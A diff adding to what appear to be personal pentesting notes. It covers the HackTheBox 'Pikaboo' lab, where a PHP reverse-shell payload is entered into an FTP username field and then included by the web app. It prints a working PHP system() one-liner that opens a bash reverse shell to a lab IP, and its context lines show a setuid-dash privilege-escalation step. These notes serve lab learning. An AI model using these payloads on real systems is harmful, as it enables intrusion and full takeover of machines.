@@ -384,6 +384,14 @@ cp /bin/dash /var/tmp/dash ; chmod u+s /var/tmp/dash
 then run
 
 zz.sh -p
+--------------------------------------------------------------------------------------------------------
 
+HackTheBox - Pikaboo 18:30 minute.
+Let's say we have a box with app in php.
+In confing fileis set that /var folder is included.
+Then we have anonymous access to ftp server.
+Then we can enter a reverseshell in the field username: and click enter for password.
+Therefore we will get a reverseshell.
+<?php system("bash -c 'bash -i >& /dev/tcp/172.20.0.23/5555 0>&1'"); ?>
 
 
